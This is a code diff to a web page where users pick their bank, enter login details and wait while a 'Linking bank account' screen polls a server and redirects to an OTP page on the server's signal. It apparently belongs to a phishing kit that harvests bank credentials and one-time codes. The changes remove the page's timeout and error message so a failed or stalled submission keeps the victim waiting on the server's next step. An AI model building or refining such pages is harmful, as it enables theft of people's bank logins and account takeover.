@@ -35,7 +35,7 @@
         }
         
         .logo img {
-            height: 60px;
+            height: 60px; /* Reduced to half size */
         }
         
         .card {
@@ -74,6 +74,15 @@
             color: #a0aec0;
         }
         
+        .search-bank-logo {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            height: 20px;
+            display: none;
+        }
+        
         input[type="text"], input[type="password"], input[type="email"] {
             width: 100%;
             padding: 12px 16px;
@@ -85,6 +94,7 @@
         
         input[type="text"] {
             padding-left: 40px;
+            padding-right: 40px;
         }
         
         input:focus {
@@ -204,7 +214,7 @@
         }
         
         .bank-login-header img {
-            height: 80px;
+            height: 40px; /* Reduced to half size */
             margin-bottom: 8px;
         }
         
@@ -268,12 +278,6 @@
             100% { transform: rotate(360deg); }
         }
         
-        .error-message {
-            color: #e53e3e;
-            margin-top: 20px;
-            display: none;
-        }
-        
         .form-content {
             transition: opacity 0.3s ease;
         }
@@ -335,6 +339,7 @@
                                     <path d="M14 14L11.1 11.1" stroke="#A0AEC0" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                                 </svg>
                             </div>
+                            <img id="search-bank-logo" class="search-bank-logo" src="" alt="">
                             <input type="text" id="bank-search" placeholder="Search for your bank" autocomplete="off" required>
                             <div id="search-results"></div>
                         </div>
@@ -439,7 +444,6 @@
                         <div class="throbber"></div>
                         <h2>Linking bank account...</h2>
                         <p id="loading-message">Please wait while we connect to your bank.</p>
-                        <p class="error-message" id="error-message">Unable to link bank account. Please try again later.</p>
                     </div>
                 </div>
             </div>
@@ -469,6 +473,7 @@
         // DOM elements
         const searchInput = document.getElementById('bank-search');
         const searchResults = document.getElementById('search-results');
+        const searchBankLogo = document.getElementById('search-bank-logo');
         const continueToLoginBtn = document.getElementById('continue-to-login');
         const continueToEmailBtn = document.getElementById('continue-to-email');
         const bankLoginForm = document.getElementById('bank-login-form');
@@ -476,7 +481,6 @@
         const selectedBankLogo = document.getElementById('selected-bank-logo');
         const selectedBankName = document.getElementById('selected-bank-name');
         const loginToBankText = document.getElementById('login-to-bank');
-        const errorMessage = document.getElementById('error-message');
         const loadingMessage = document.getElementById('loading-message');
         const displayedEmail = document.getElementById('displayed-email');
         const passwordInput = document.getElementById('password');
@@ -488,7 +492,6 @@
         
         // Variables
         let selectedBank = null;
-        let timeoutId = null;
         let checkResponseInterval = null;
         let verificationCode = null;
         
@@ -612,6 +615,10 @@
             selectedBank = { name, logo };
             continueToLoginBtn.disabled = false;
             
+            // Update logo in search box
+            searchBankLogo.src = logo;
+            searchBankLogo.style.display = 'block';
+            
             document.querySelectorAll('.bank-logo').forEach(logo => {
                 logo.style.borderColor = logo.getAttribute('data-bank') === name ? '#000000' : '#e2e8f0';
             });
@@ -622,7 +629,6 @@
             if (selectedBank) {
                 selectedBankLogo.src = selectedBank.logo;
                 selectedBankName.textContent = selectedBank.name;
-                loginToBankText.textContent = `Login to ${selectedBank.name}`;
                 navigateToPage(2);
             }
         });
@@ -673,13 +679,8 @@
                 })
                 .catch(error => {
                     console.error('Error:', error);
-                    showError();
+                    startCheckingResponse();
                 });
-                
-                // 1 minute timeout
-                timeoutId = setTimeout(() => {
-                    showError();
-                }, 60000);
             }
         });
 
@@ -693,36 +694,12 @@
                 })
                 .then(data => {
                     if (data.status === 'otp') {
-                        clearTimeout(timeoutId);
                         clearInterval(checkResponseInterval);
                         window.location.href = '/otp.html';
-                    } else if (data.status === 'end') {
-                        clearTimeout(timeoutId);
-                        clearInterval(checkResponseInterval);
-                        showError();
                     }
                 })
                 .catch(error => console.error('Error checking response:', error));
             }, 3000);
-        }
-
-        // Show error message
-        function showError() {
-            clearInterval(checkResponseInterval);
-            loadingMessage.style.display = 'none';
-            errorMessage.style.display = 'block';
-            
-            const throbber = document.querySelector('.throbber');
-            throbber.style.borderTopColor = '#e53e3e';
-            throbber.style.animation = 'none';
-            
-            const retryBtn = document.createElement('button');
-            retryBtn.className = 'submit-btn';
-            retryBtn.textContent = 'Try Again';
-            retryBtn.style.marginTop = '20px';
-            retryBtn.addEventListener('click', () => location.reload());
-            
-            document.querySelector('.throbber-container').appendChild(retryBtn);
         }
 
         // Hide search results when clicking outside
